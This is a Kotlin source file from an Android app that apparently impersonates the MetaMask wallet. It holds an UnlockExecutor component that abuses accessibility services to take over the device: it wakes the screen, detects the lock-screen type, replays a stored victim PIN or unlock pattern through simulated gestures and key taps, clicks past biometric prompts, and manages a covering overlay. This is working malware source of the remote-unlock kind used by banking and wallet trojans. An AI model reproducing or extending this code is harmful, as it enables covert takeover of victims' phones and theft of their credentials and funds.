package com.example.MetaMask.receivers

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.KeyguardManager
import android.content.Context
import android.graphics.Path
import android.graphics.PointF
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.DisplayMetrics
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import com.example.MetaMask.activities.WakeScreenActivity
import com.example.MetaMask.services.UnlockMonitor
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

internal object UnlockExecutor {

    @Volatile var inProgress = false

    private enum class ScreenState {
        UNLOCKED,
        SWIPE,
        PATTERN,
        PIN_PASSWORD,
        BIOMETRIC,
        UNKNOWN
    }

    private val CELL_RE = Regex(
        "(?:Ячейка|Cell|格|格子|點|셀|Pola)\\s*(\\d+)",
        RegexOption.IGNORE_CASE
    )

    fun execute(context: Context, svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[UnlockExecutor] execute enter context=ctx svc=${svc}") //xdbg
        if (inProgress) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            return
        }
        inProgress = true
        Thread {
            try { runFlow(context, svc) }
            catch (_: Exception) {}
            finally {
                Handler(Looper.getMainLooper()).postDelayed({
                    UnlockMonitor.isReplayMode = false
                }, 6000L)
                inProgress = false
            }
        }.start()
    }

    fun executeInApp(context: Context, svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[UnlockExecutor] executeInApp enter context=ctx svc=${svc}") //xdbg
        if (inProgress) return
        inProgress = true
        Thread {
            try {
                val dm = context.resources.displayMetrics
                val W  = dm.widthPixels.toFloat()
                val H  = dm.heightPixels.toFloat()
                val wm = svc.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val realH: Float = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    wm.currentWindowMetrics.bounds.height().toFloat()
                } else {
                    val dm2 = DisplayMetrics()
                    @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm2)
                    dm2.heightPixels.toFloat()
                }
                val method = context.getSharedPreferences("cfg", Context.MODE_PRIVATE)
                    .getString("unlock_method_json", null)
                    ?.let { runCatching { JSONObject(it) }.getOrNull() }
                val unlockType = method?.optString("type", "") ?: ""
                when (unlockType) {
                    "pattern"           -> doPattern(svc, method, W, H, realH)
                    "pin", "password"   -> doPin(svc, method, W, H)
                    else -> {}
                }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[UnlockExecutor] catch (ignored)") //xdbg
            } finally {
                Handler(Looper.getMainLooper()).postDelayed({
                    UnlockMonitor.isReplayMode = false
                }, 6000L)
                inProgress = false
            }
        }.start()
    }

    private fun runFlow(context: Context, svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[UnlockExecutor] runFlow enter context=ctx svc=${svc}") //xdbg
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

        val overlayHelper = (svc as? com.example.MetaMask.services.AccessSvc)?.martenHelper

        @Suppress("DEPRECATION")
        val wl = pm.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "cristofer:unlock"
        )
        wl.acquire(15_000L)
        val passActivatedByUs = booleanArrayOf(false)

        try {
            Thread.sleep(150L)

            if (!pm.isInteractive) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val wakeSignal = WakeScreenActivity.wake(context)
                wakeSignal.await(3000L, TimeUnit.MILLISECONDS)
                Thread.sleep(500L)
            }

            var interactive = false
            repeat(30) {
                if (pm.isInteractive) { interactive = true; return@repeat }
                Thread.sleep(100L)
            }
            if (!interactive) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                return
            }
            Thread.sleep(400L)

            if (!km.isKeyguardLocked) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                return
            }

            val dm = context.resources.displayMetrics
            val W  = dm.widthPixels.toFloat()
            val H  = dm.heightPixels.toFloat()
            val wm = svc.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val realH: Float = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                wm.currentWindowMetrics.bounds.height().toFloat()
            } else {
                val dm2 = DisplayMetrics()
                @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm2)
                dm2.heightPixels.toFloat()
            }

            val method = context.getSharedPreferences("cfg", Context.MODE_PRIVATE)
                .getString("unlock_method_json", null)
                ?.let { runCatching { JSONObject(it) }.getOrNull() }
            val unlockType = method?.optString("type", "swipe") ?: "swipe"

            var state = ScreenState.UNKNOWN
            repeat(8) {
                state = detectState(svc, km)
                if (state == ScreenState.UNLOCKED) return
                if (state != ScreenState.UNKNOWN) return@repeat
                Thread.sleep(250L)
            }

            if (state == ScreenState.BIOMETRIC) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                handleBiometric(svc, km, method, W, H, realH)
                return
            }

            if (state == ScreenState.PIN_PASSWORD &&
                (unlockType == "pin" || unlockType == "password")) {
                doPin(svc, method, W, H)
                return
            }

            if (overlayHelper != null && overlayHelper.isShowing() && overlayHelper.passthroughCount == 0) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val ptLatch = java.util.concurrent.CountDownLatch(1)
                Handler(Looper.getMainLooper()).post {
                    overlayHelper.beginGesturePassthrough()
                    passActivatedByUs[0] = true
                    ptLatch.countDown()
                }
                ptLatch.await(500L, TimeUnit.MILLISECONDS)
                Thread.sleep(150L)
            }
            doSwipe(svc, W, H)

            when (unlockType) {
                "pattern" -> {
                    Thread.sleep(700L)
                    doPattern(svc, method, W, H, realH)
                }

                "pin", "password" -> {
                    Thread.sleep(900L)
                    if (!km.isKeyguardLocked) return
                    doPin(svc, method, W, H)
                }

                "swipe" -> {
                    Thread.sleep(500L)
                }

                else -> {
                    Thread.sleep(1000L)
                    repeat(6) {
                        state = detectState(svc, km)
                        if (state != ScreenState.SWIPE && state != ScreenState.UNKNOWN) return@repeat
                        Thread.sleep(300L)
                    }
                    if (!km.isKeyguardLocked) return
                    if (handleAuth(state, svc, km, method, W, H, realH)) return

                    dispatchGlobal(svc, AccessibilityService.GLOBAL_ACTION_HOME)
                    Thread.sleep(600L)
                    doSwipe(svc, W, H)
                    Thread.sleep(1000L)
                    state = detectState(svc, km)
                    handleAuth(state, svc, km, method, W, H, realH)
                }
            }

        } finally {
            if (passActivatedByUs[0]) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val ptLatch = java.util.concurrent.CountDownLatch(1)
                Handler(Looper.getMainLooper()).post {
                    overlayHelper?.endGesturePassthrough()
                    ptLatch.countDown()
                }
                ptLatch.await(500L, TimeUnit.MILLISECONDS)
            }
            try { wl.release() } catch (_: Exception) {}
        }
    }

    private fun handleAuth(
        state: ScreenState,
        svc: AccessibilityService,
        km: KeyguardManager,
        method: JSONObject?,
        W: Float, H: Float, realH: Float
    ): Boolean = when (state) {
        ScreenState.UNLOCKED     -> true
        ScreenState.PATTERN      -> { doPattern(svc, method, W, H, realH); true }
        ScreenState.PIN_PASSWORD -> { doPin(svc, method, W, H); true }
        ScreenState.BIOMETRIC    -> { handleBiometric(svc, km, method, W, H, realH); true }
        else -> false
    }

    private fun handleBiometric(
        svc: AccessibilityService,
        km: KeyguardManager,
        method: JSONObject?,
        W: Float, H: Float, realH: Float
    ) {
        val clicked = clickBiometricFallback(svc, W, H)
        if (clicked) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            var next = ScreenState.BIOMETRIC
            repeat(10) {
                Thread.sleep(300L)
                next = detectState(svc, km)
                if (next != ScreenState.BIOMETRIC && next != ScreenState.UNKNOWN) return@repeat
            }
            handleAuth(next, svc, km, method, W, H, realH)
        }
    }

    private fun detectState(svc: AccessibilityService, km: KeyguardManager): ScreenState {
        android.util.Log.d("XDBG", "[UnlockExecutor] detectState enter svc=${svc} km=${km}") //xdbg
        if (!km.isKeyguardLocked) return ScreenState.UNLOCKED

        val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }
        if (activeRoot != null) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            val s = try { classifyTree(activeRoot) }
                    finally { try { activeRoot.recycle() } catch (_: Exception) {} }
            if (s != ScreenState.SWIPE) return s
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            try {
                val windows = svc.windows
                if (windows != null) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                    for (win in windows) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                        val winRoot = try { win.root } catch (_: Exception) { null }
                        if (winRoot != null) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                            val s = try { classifyTree(winRoot) }
                                    finally { try { winRoot.recycle() } catch (_: Exception) {} }
                            try { win.recycle() } catch (_: Exception) {}
                            if (s != ScreenState.SWIPE) return s
                        } else {
                            try { win.recycle() } catch (_: Exception) {}
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
        return if (activeRoot == null) ScreenState.UNKNOWN else ScreenState.SWIPE
    }

    private fun classifyTree(root: AccessibilityNodeInfo): ScreenState {
        android.util.Log.d("XDBG", "[UnlockExecutor] classifyTree enter root=${root}") //xdbg
        var hasPattern = false
        var hasPin     = false
        var hasBio     = false

        fun walk(n: AccessibilityNodeInfo, depth: Int) {
            android.util.Log.d("XDBG", "[UnlockExecutor] walk enter n=${n} depth=${depth}") //xdbg
            if (depth > 12) return
            val cls = n.className?.toString() ?: ""

            if (cls.contains("LockPattern", ignoreCase = true) ||
                cls.contains("PatternView",  ignoreCase = true)) hasPattern = true

            val txt = "${n.text ?: ""}${n.contentDescription ?: ""}"
            if (!hasPattern && CELL_RE.containsMatchIn(txt)) hasPattern = true

            if ((n.isPassword || n.isEditable) && n.isVisibleToUser) hasPin = true
            if (cls.contains("PasswordTextView",  ignoreCase = true) ||
                cls.contains("PinPad",            ignoreCase = true) ||
                cls.contains("NumericKeyboard",   ignoreCase = true) ||
                cls.contains("KeyguardPIN",       ignoreCase = true) ||
                cls.contains("KeyguardPassword",  ignoreCase = true) ||
                cls.contains("PasswordEntry",     ignoreCase = true)) hasPin = true

            if (cls.contains("Fingerprint",      ignoreCase = true) ||
                cls.contains("Biometric",        ignoreCase = true) ||
                cls.contains("FaceAuth",         ignoreCase = true) ||
                cls.contains("FaceUnlock",       ignoreCase = true) ||
                cls.contains("UdfpsController",  ignoreCase = true)) hasBio = true

            if (!hasPattern && n.isClickable) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val b = Rect(); n.getBoundsInScreen(b)
                val w = b.width(); val h = b.height()
                if (w in 250..1100 && h in 250..1100 && kotlin.math.abs(w - h) < w * 0.25f) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                    var sqKids = 0
                    for (ci in 0 until n.childCount) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                        val ch2 = try { n.getChild(ci) } catch (_: Exception) { null } ?: continue
                        if (ch2.isClickable) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                            val cb = Rect(); ch2.getBoundsInScreen(cb)
                            val cw = cb.width(); val ch2h = cb.height()
                            if (cw in 30..400 && ch2h in 30..400 &&
                                kotlin.math.abs(cw - ch2h) < 60) sqKids++
                        }
                        try { ch2.recycle() } catch (_: Exception) {}
                    }
                    if (sqKids >= 4) hasPattern = true
                }
            }

            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try { walk(ch, depth + 1) } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
        }
        walk(root, 0)

        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
        return when {
            hasPattern -> ScreenState.PATTERN
            hasPin     -> ScreenState.PIN_PASSWORD
            hasBio     -> ScreenState.BIOMETRIC
            else       -> ScreenState.SWIPE
        }
    }

    private fun doPattern(
        svc: AccessibilityService, method: JSONObject?,
        W: Float, H: Float, realH: Float
    ) {
        val dotsArr = method?.optJSONArray("dots")
        if (dotsArr == null || dotsArr.length() < 2) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            return
        }

        fun scanTree(): Pair<MutableMap<Int, PointF>, Rect?> {
            android.util.Log.d("XDBG", "[UnlockExecutor] scanTree enter") //xdbg
            val centers = mutableMapOf<Int, PointF>()
            var container: Rect? = null

            fun scanRoot(root: AccessibilityNodeInfo) {
                android.util.Log.d("XDBG", "[UnlockExecutor] scanRoot enter root=${root}") //xdbg
                fun scan(node: AccessibilityNodeInfo) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] scan enter node=${node}") //xdbg
                    val txt = "${node.text ?: ""}${node.contentDescription ?: ""}"
                    val m = CELL_RE.find(txt)
                    if (m != null) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        val cn = m.groupValues[1].toIntOrNull()
                        if (cn != null && cn in 1..36) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                            val b = Rect(); node.getBoundsInScreen(b)
                            if (b.width() > 20 && b.height() > 20)
                                centers[cn - 1] = PointF(b.exactCenterX(), b.exactCenterY())
                        }
                    }

                    if (m == null && node.isClickable && container == null) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        val b = Rect(); node.getBoundsInScreen(b)
                        val w = b.width(); val h2 = b.height()
                        if (w in 200..1200 && h2 in 200..1200 &&
                            kotlin.math.abs(w - h2) < 120)
                            container = b
                    }

                    val cls = node.className?.toString() ?: ""
                    if (container == null &&
                        (cls.contains("LockPattern", ignoreCase = true) ||
                         cls.contains("PatternView",  ignoreCase = true))) {
                        val b = Rect(); node.getBoundsInScreen(b)
                        if (b.width() > 100 && b.height() > 100) container = b
                    }

                    for (i in 0 until node.childCount) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                        val ch = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                        try { scan(ch) } finally { try { ch.recycle() } catch (_: Exception) {} }
                    }
                }
                try { scan(root) } finally { try { root.recycle() } catch (_: Exception) {} }
            }

            val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (activeRoot != null) scanRoot(activeRoot)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                try {
                    val windows = svc.windows
                    if (windows != null) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        for (win in windows) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                            val winRoot = try { win.root } catch (_: Exception) { null }
                            if (winRoot != null) scanRoot(winRoot)
                            try { win.recycle() } catch (_: Exception) {}
                            if (centers.size >= 9 && container != null) break
                        }
                    }
                } catch (_: Exception) {}
            }

            android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
            return Pair(centers, container)
        }

        var (cellCenters, containerRect) = scanTree()

        UnlockMonitor.isReplayMode = true

        val probePoint: PointF = if (containerRect != null) {
            val cb = containerRect!!
            PointF(cb.left + cb.width() * 0.167f, cb.top + cb.height() * 0.167f)
        } else {
            PointF(W * 0.30f, realH * 0.66f)
        }

        val probeLatch = CountDownLatch(1)
        Handler(Looper.getMainLooper()).post {
            val probePath = Path().apply { moveTo(probePoint.x, probePoint.y) }
            val probeGesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(probePath, 0L, 60L))
                .build()
            svc.dispatchGesture(probeGesture, object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) { probeLatch.countDown() }
                override fun onCancelled(g: GestureDescription?) { probeLatch.countDown() }
            }, null)
        }
        probeLatch.await(400L, TimeUnit.MILLISECONDS)

        var scanTries = 0
        while (cellCenters.size < 9 && scanTries < 25) {
            android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
            val (c, cont) = scanTree()
            if (c.size > cellCenters.size) cellCenters = c
            if (cont != null && containerRect == null) containerRect = cont
            if (cellCenters.size < 9) Thread.sleep(80L)
            scanTries++
        }

        Thread.sleep(600L)

        val gridCols: Int = run {
            if (cellCenters.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val maxIdx = cellCenters.keys.maxOrNull() ?: 8
                Math.ceil(Math.sqrt((maxIdx + 1).toDouble())).toInt().coerceAtLeast(3)
            } else {
                val savedGridSize = method?.optInt("gridSize", 9) ?: 9
                Math.ceil(Math.sqrt(savedGridSize.toDouble())).toInt().coerceAtLeast(3)
            }
        }

        val finalCells = cellCenters
        val finalContainer = containerRect

        fun dotPt(idx: Int): PointF {
            android.util.Log.d("XDBG", "[UnlockExecutor] dotPt enter idx=${idx}") //xdbg
            finalCells[idx]?.let { return it }

            val cb = finalContainer
            if (cb != null) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val cw = cb.width()  / gridCols.toFloat()
                val ch = cb.height() / gridCols.toFloat()
                val col = idx % gridCols; val row = idx / gridCols
                android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
                return PointF(cb.left + col * cw + cw / 2f, cb.top + row * ch + ch / 2f)
            }

            val gLeft  = W     * 0.23f; val gTop  = realH * 0.622f
            val gRight = W     * 0.77f; val gBot  = realH * 0.883f
            val cellW  = (gRight - gLeft) / gridCols.toFloat()
            val cellH  = (gBot - gTop)    / gridCols.toFloat()
            val col = idx % gridCols; val row = idx / gridCols
            android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
            return PointF(gLeft + col * cellW + cellW / 2f, gTop + row * cellH + cellH / 2f)
        }

        val latch = CountDownLatch(1)
        Handler(Looper.getMainLooper()).post {
            try {
                val path = Path()
                val p0 = dotPt(dotsArr.getInt(0))
                path.moveTo(p0.x, p0.y)
                for (i in 1 until dotsArr.length()) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                    val p = dotPt(dotsArr.getInt(i))
                    path.lineTo(p.x, p.y)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0L, 1200L))
                    .build()
                svc.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {
                    override fun onCompleted(g: GestureDescription?) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] onCompleted enter g=${g}") //xdbg
                        Handler(Looper.getMainLooper()).postDelayed({
                            UnlockMonitor.isReplayMode = false
                        }, 2000L)
                        latch.countDown()
                    }
                    override fun onCancelled(g: GestureDescription?) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] onCancelled enter g=${g}") //xdbg
                        UnlockMonitor.isReplayMode = false
                        latch.countDown()
                    }
                }, null)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[UnlockExecutor] catch (ignored)") //xdbg
                UnlockMonitor.isReplayMode = false
                latch.countDown()
            }
        }
        latch.await(2500L, TimeUnit.MILLISECONDS)
    }

    private fun doPin(svc: AccessibilityService, method: JSONObject?, W: Float, H: Float) {
        android.util.Log.d("XDBG", "[UnlockExecutor] doPin enter svc=${svc} method=${method} W=${W} H=${H}") //xdbg
        val code = method?.optString("code", "") ?: ""
        if (code.isEmpty()) {
            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
            return
        }
        Thread.sleep(300L)

        val latch = CountDownLatch(1)
        Handler(Looper.getMainLooper()).post {
            try {
                val root = svc.rootInActiveWindow
                var typed = false
                if (root != null) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                    fun findAndType(n: AccessibilityNodeInfo): Boolean {
                        android.util.Log.d("XDBG", "[UnlockExecutor] findAndType enter n=${n}") //xdbg
                        if ((n.isPassword || n.isEditable ||
                             n.className?.contains("EditText") == true) && n.isVisibleToUser) {
                            val resId = try { n.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                            if (resId.contains("pinEntry")) return false
                            val args = Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, code)
                            }
                            android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
                            return n.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        }
                        for (i in 0 until n.childCount) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                            val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                            val r = findAndType(ch)
                            try { ch.recycle() } catch (_: Exception) {}
                            if (r) return true
                        }
                        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
                        return false
                    }
                    typed = findAndType(root)
                    try { root.recycle() } catch (_: Exception) {}
                }

                if (typed) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                    Handler(Looper.getMainLooper()).postDelayed({
                        clickConfirmButton(svc, W, H)
                        latch.countDown()
                    }, 350L)
                } else {
                    for (ch in code) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                        var clicked = false
                        try {
                            val r = svc.rootInActiveWindow
                            if (r != null) {
                                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                                val keyNodes = r.findAccessibilityNodeInfosByViewId(
                                    "com.android.systemui:id/key$ch")
                                val btn = keyNodes?.firstOrNull { it.isClickable }
                                if (btn != null) {
                                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    clicked = true
                                }
                                keyNodes?.forEach { try { it.recycle() } catch (_: Exception) {} }
                                try { r.recycle() } catch (_: Exception) {}
                            }
                        } catch (_: Exception) {}
                        if (!clicked) {
                            android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                            val nodes = try {
                                svc.rootInActiveWindow
                                    ?.findAccessibilityNodeInfosByText(ch.toString())
                            } catch (_: Exception) { null }
                            nodes?.firstOrNull { it.isClickable }
                                ?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        }
                        Thread.sleep(80L)
                    }
                    Handler(Looper.getMainLooper()).postDelayed({
                        clickConfirmButton(svc, W, H)
                        latch.countDown()
                    }, 400L)
                }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[UnlockExecutor] catch (ignored)") //xdbg
                latch.countDown()
            }
        }
        latch.await(4500L, TimeUnit.MILLISECONDS)
    }

    private fun clickConfirmButton(svc: AccessibilityService, W: Float, H: Float) {
        android.util.Log.d("XDBG", "[UnlockExecutor] clickConfirmButton enter svc=${svc} W=${W} H=${H}") //xdbg
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return
        try {
            var textBtn: AccessibilityNodeInfo? = null
            var posBtn: AccessibilityNodeInfo? = null
            val confirmHints = setOf("ok", "done", "enter", "confirm", "готово", "ввод", "далее", "next")
            fun find(n: AccessibilityNodeInfo, depth: Int) {
                android.util.Log.d("XDBG", "[UnlockExecutor] find enter n=${n} depth=${depth}") //xdbg
                if (depth > 12) return
                val cls = n.className?.toString() ?: ""
                if ((cls.contains("Button", ignoreCase = true) || n.isClickable) &&
                    n.isEnabled && n.isVisibleToUser) {
                    if (textBtn == null) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        val text = n.text?.toString()?.trim()?.lowercase() ?: ""
                        val desc = n.contentDescription?.toString()?.trim()?.lowercase() ?: ""
                        if (confirmHints.any { text == it || desc.contains(it) })
                            textBtn = AccessibilityNodeInfo.obtain(n)
                    }
                    if (posBtn == null) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        val b = Rect(); n.getBoundsInScreen(b)
                        if (b.centerY() > H * 0.75f && b.centerX() > W * 0.55f &&
                            b.width() in 60..400 && b.height() in 60..200)
                            posBtn = AccessibilityNodeInfo.obtain(n)
                    }
                }
                for (i in 0 until n.childCount) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                    val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { find(ch, depth + 1) } finally { try { ch.recycle() } catch (_: Exception) {} }
                }
            }
            find(root, 0)
            val winner = textBtn ?: posBtn
            val loser = if (textBtn != null) posBtn else null
            winner?.let { it.performAction(AccessibilityNodeInfo.ACTION_CLICK); try { it.recycle() } catch (_: Exception) {} }
            loser?.let { try { it.recycle() } catch (_: Exception) {} }
        } finally { try { root.recycle() } catch (_: Exception) {} }
    }

    private fun clickBiometricFallback(svc: AccessibilityService, W: Float, H: Float): Boolean {
        android.util.Log.d("XDBG", "[UnlockExecutor] clickBiometricFallback enter svc=${svc} W=${W} H=${H}") //xdbg
        for (attempt in 0 until 10) {
            android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val btn = try {
                    findInBiometricContainer(root) ?: findByPositionHeuristic(root, W, H)
                } catch (_: Exception) { null }
                try { root.recycle() } catch (_: Exception) {}
                if (btn != null) {
                    android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                    val b = Rect(); btn.getBoundsInScreen(b)
                    val tapped = tapGesture(svc, b.centerX().toFloat(), b.centerY().toFloat())
                    try { btn.recycle() } catch (_: Exception) {}
                    if (tapped) {
                        android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
                        return true
                    }
                }
            }
            Thread.sleep(300L)
        }
        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
        return false
    }

    private fun findInBiometricContainer(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[UnlockExecutor] findInBiometricContainer enter root=${root}") //xdbg
        fun walk(n: AccessibilityNodeInfo, depth: Int, inBio: Boolean): AccessibilityNodeInfo? {
            android.util.Log.d("XDBG", "[UnlockExecutor] walk enter n=${n} depth=${depth} inBio=${inBio}") //xdbg
            if (depth > 12) return null
            val cls = n.className?.toString() ?: ""
            val nowInBio = inBio ||
                cls.contains("BiometricPrompt",   ignoreCase = true) ||
                cls.contains("FingerprintDialog", ignoreCase = true) ||
                cls.contains("BiometricLayout",   ignoreCase = true) ||
                cls.contains("BiometricBouncer",  ignoreCase = true) ||
                cls.contains("KeyguardBouncer",   ignoreCase = true)
            if (nowInBio && n.isClickable && n.isEnabled && n.isVisibleToUser) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val b = Rect(); n.getBoundsInScreen(b)
                if (b.width() > 80 && b.height() > 30) return AccessibilityNodeInfo.obtain(n)
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                val result = walk(ch, depth + 1, nowInBio)
                try { ch.recycle() } catch (_: Exception) {}
                if (result != null) return result
            }
            android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
            return null
        }
        android.util.Log.d("XDBG", "[UnlockExecutor] return") //xdbg
        return walk(root, 0, false)
    }

    private fun findByPositionHeuristic(root: AccessibilityNodeInfo, W: Float, H: Float): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[UnlockExecutor] findByPositionHeuristic enter root=${root} W=${W} H=${H}") //xdbg
        data class Candidate(val node: AccessibilityNodeInfo, val centerY: Int)
        val candidates = mutableListOf<Candidate>()
        fun collect(n: AccessibilityNodeInfo, depth: Int) {
            android.util.Log.d("XDBG", "[UnlockExecutor] collect enter n=${n} depth=${depth}") //xdbg
            if (depth > 10) return
            if (n.isClickable && n.isEnabled && n.isVisibleToUser) {
                android.util.Log.d("XDBG", "[UnlockExecutor] if branch") //xdbg
                val b = Rect(); n.getBoundsInScreen(b)
                if (b.centerY() > H * 0.4f && b.width() > W * 0.1f &&
                    b.width() < W * 0.85f && b.height() in 36..220) {
                    candidates.add(Candidate(AccessibilityNodeInfo.obtain(n), b.centerY()))
                }
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[UnlockExecutor] loop") //xdbg
                val ch = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                try { collect(ch, depth + 1) } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
        }
        collect(root, 0)
        if (candidates.isEmpty()) return null
        candidates.sortByDescending { it.centerY }
        val winner = candidates.first()
        candidates.drop(1).forEach { try { it.node.recycle() } catch (_: Exception) {} }
        return winner.node
    }

    private fun doSwipe(svc: AccessibilityService, W: Float, H: Float) {
        android.util.Log.d("XDBG", "[UnlockExecutor] doSwipe enter svc=${svc} W=${W} H=${H}") //xdbg
        val latch = CountDownLatch(1)
        Handler(Looper.getMainLooper()).post {
            val path = Path().apply { moveTo(W / 2f, H * 0.88f); lineTo(W / 2f, H * 0.25f) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 400L)).build()
            svc.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) { latch.countDown() }
                override fun onCancelled(g: GestureDescription?) { latch.countDown() }
            }, null)
        }
        latch.await(600L, TimeUnit.MILLISECONDS)
    }

